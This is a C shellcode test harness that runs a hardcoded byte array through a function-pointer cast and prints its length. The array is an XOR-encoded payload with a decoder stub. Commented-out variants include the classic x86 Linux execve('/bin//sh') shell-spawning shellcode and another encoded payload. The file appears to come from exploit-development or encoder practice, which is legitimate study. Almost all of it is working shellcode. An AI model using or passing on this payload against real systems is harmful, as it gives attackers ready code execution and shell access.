#include<stdio.h>
#include<string.h>

unsigned char code[] = \

//"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

/*
"\x5c\x78\x33\x31\x5c\x78\x63\x30\x5c\x78\x35\x30\x5c\x78\x36"
"\x38\x5c\x78\x32\x66\x5c\x78\x32\x66\x5c\x78\x37\x33\x5c\x78"
"\x36\x38\x5c\x78\x36\x38\x5c\x78\x32\x66\x5c\x78\x36\x32\x5c"
"\x78\x36\x39\x5c\x78\x36\x65\x5c\x78\x38\x39\x5c\x78\x65\x33"
"\x5c\x78\x35\x30\x5c\x78\x38\x39\x5c\x78\x65\x32\x5c\x78\x35"
"\x33\x5c\x78\x38\x39\x5c\x78\x65\x31\x5c\x78\x62\x30\x5c\x78"
"\x30\x62\x5c\x78\x63\x64\x5c\x78\x38\x30\x0a";
*/

/*
"\xfc\xbb\xe4\x5d\xd1\xb6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xb8\x25\xe2\x87\x1c"
"\xae\x67\xd8\xc0\x36\x5d\x28\xa4\xbe\xab\x70\x08\x47\xe6\xe6"
"\xec\xcf\x34\x81\x50\x48\x0e\x7e\x34\xd0\x46\xb8\x98\x58\x91"
"\x80\x7c\xe1\xef\x96\x20\x69\x26\x65\x84\xf1\x70\xb0\x68\x7a"
"\x4b\xa7\xcc\x02\x8b\x1e\xb0\x8a\x8e\x53\x14\x13\x64\xa4\xf8"
"\x9b\xbe\xfd\x5c\x24\xda\xcf\x00\xac\x11\x03\xe4\x34\x62\x5a"
"\x48\xbd\xf7\xad\x2c\x45\x9a\xfd\x90\xcd\x6a\x9c\x74\x56\xe8"
"\x04\xd8\xde\xd6\xf4\xea\x1e\x27\xf5\xea\x1e\x27\xf5";
*/

"\xfc\xbb\x63\x25\x6a\xc9\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3f\x5d\x59\xf8\xe3"
"\xe5\xfe\xca\x47\x6e\x34\x1b\x2b\xf6\x00\x63\x8f\x7e\x5f\xf5"
"\x73\x07\xad\x9f\xd7\x8f\xe6\x6c\xbb\x17\x3f\xab\x1f\x90\x09"
"\xf3\xc3\x18\x44\x65\xa7\xa0\x9e\x5b\x0b\x29\xe9\xa2\xef\xb1"
"\x23\xb0\x53\x3a\x74\x03\x37\xc2\xe1\x40\x9b\x4a\xdf\x96\x7f"
"\xd3\x27\xee\x23\x5b\x3d\x22\x87\xe3\x88\x71\x6b\x6c\xcb\x4c"
"\xcf\xf4\x4e\x9e\xb3\x7c\xf3\xd0\x17\x05\xc3\x72\xfb\x8d\x40"
"\x17\x5f\x16\xbf\xe7\x55\xe6\xbf\x07\x69\xe6\xbf\x07";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	